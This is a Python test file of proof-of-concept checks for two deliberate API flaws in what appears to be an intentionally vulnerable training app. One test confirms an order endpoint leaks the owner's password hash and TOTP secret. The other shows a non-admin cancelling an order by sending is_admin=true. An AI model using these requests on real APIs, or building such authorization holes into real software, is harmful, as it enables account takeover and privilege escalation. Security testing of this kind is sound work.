"""
BFLA & BOPLA PoC Tests (Vulnerabilities #24, #25)
"""
import requests


class TestBOPLADataExposure:
    """#24 - BOPLA: GET /orders/:id leaks sensitive user fields"""

    def test_vuln_24_bopla_data_exposure(self, base_url, joe_token):
        """Order detail response contains owner_password_hash and owner_totp_secret."""
        h = {"Authorization": f"Bearer {joe_token}"}
        r = requests.get(f"{base_url}/orders/3", headers=h)
        data = r.json()
        assert data["success"] is True
        order = data["order"]
        assert "owner_password_hash" in order, \
            "BOPLA: owner_password_hash not exposed in order response"
        assert "owner_totp_secret" in order, \
            "BOPLA: owner_totp_secret not exposed in order response"
        assert order["owner_password_hash"].startswith("$2y$"), \
            "Leaked password hash does not look like a bcrypt hash"


class TestBFLAOrderStatus:
    """#25 - BFLA: PUT /orders/:id/status trusts is_admin from request body"""

    def test_vuln_25_bfla_order_status(self, base_url, joe_token):
        """Non-admin user can update order status by sending is_admin=true in body."""
        h = {"Authorization": f"Bearer {joe_token}"}
        r = requests.put(f"{base_url}/orders/1/status", headers=h,
                         json={"is_admin": True, "status": "cancelled"})
        data = r.json()
        assert data["success"] is True, f"BFLA failed: {data}"
        assert "cancelled" in data.get("message", "").lower()
